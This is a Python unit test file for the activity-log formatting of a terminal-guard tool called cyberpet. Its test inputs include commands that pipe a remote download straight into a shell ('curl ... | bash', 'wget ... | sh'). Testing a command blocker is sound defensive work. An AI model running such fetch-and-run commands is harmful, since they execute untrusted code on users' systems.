"""Tests for UI activity log formatting and noise filtering."""

from __future__ import annotations

import unittest

from cyberpet.events import Event, EventType
from cyberpet.ui.pet import CyberPetApp


class UIEventLogFormattingTests(unittest.TestCase):
    """Verify activity feed stays concise and user-focused."""

    def setUp(self) -> None:
        self.app = CyberPetApp()

    def test_system_stats_events_are_not_logged(self) -> None:
        event = Event(
            type=EventType.SYSTEM_STAT_UPDATE,
            source="daemon",
            data={"cpu": 10.2, "ram": 44.1},
            severity=0,
        )
        line = self.app._format_event_log_line(event, "", "")
        self.assertIsNone(line)

    def test_blocked_event_line_is_compact(self) -> None:
        event = Event(
            type=EventType.CMD_BLOCKED,
            source="terminal_guard",
            data={},
            severity=95,
        )
        command = "curl http://example.com/install.sh | bash --with-very-long-arguments"
        reason = "Piping remote download directly to shell; unusual hour (+10)"
        line = self.app._format_event_log_line(event, command, reason)
        self.assertIsNotNone(line)
        assert line is not None
        self.assertTrue(line.startswith("BLOCKED: "))
        self.assertIn("downloads and runs a script directly from the internet", line)
        self.assertIn("Risk: Critical (95)", line)
        self.assertNotIn("\n", line)

    def test_checked_event_line_is_compact(self) -> None:
        event = Event(
            type=EventType.CMD_INTERCEPTED,
            source="terminal_guard",
            data={},
            severity=0,
        )
        line = self.app._format_event_log_line(
            event,
            "this is a very long command that should be clipped for the activity panel",
            "",
        )
        self.assertIsNone(line)

    def test_multiline_values_are_normalized(self) -> None:
        event = Event(
            type=EventType.CMD_WARNED,
            source="terminal_guard",
            data={},
            severity=64,
        )
        line = self.app._format_event_log_line(
            event,
            "wget http://x |\n sh",
            "Piping remote\n download directly to shell",
        )
        self.assertIsNotNone(line)
        assert line is not None
        self.assertIn("WARNING:", line)
        self.assertIn("downloads and runs a script directly from the internet", line)
        self.assertNotIn("\n", line)

    def test_allowed_line_hidden_by_default(self) -> None:
        event = Event(
            type=EventType.CMD_ALLOWED,
            source="terminal_guard",
            data={},
            severity=3,
        )
        line = self.app._format_event_log_line(event, "ls -la", "")
        self.assertIsNone(line)

    def test_allowed_line_can_be_enabled(self) -> None:
        app = CyberPetApp(show_allowed_events=True)
        event = Event(
            type=EventType.CMD_ALLOWED,
            source="terminal_guard",
            data={},
            severity=3,
        )
        line = app._format_event_log_line(event, "ls -la", "")
        self.assertIsNotNone(line)
        assert line is not None
        self.assertEqual(line, "ALLOWED: ls -la")

    def test_command_preview_is_shortened(self) -> None:
        event = Event(
            type=EventType.CMD_BLOCKED,
            source="terminal_guard",
            data={},
            severity=90,
        )
        long_cmd = "python3 -c 'print(1)' && echo this command is intentionally very long"
        line = self.app._format_event_log_line(event, long_cmd, "Format disk device")
        self.assertIsNotNone(line)
        assert line is not None
        self.assertIn("BLOCKED:", line)
        self.assertIn("...", line)


if __name__ == "__main__":
    unittest.main()
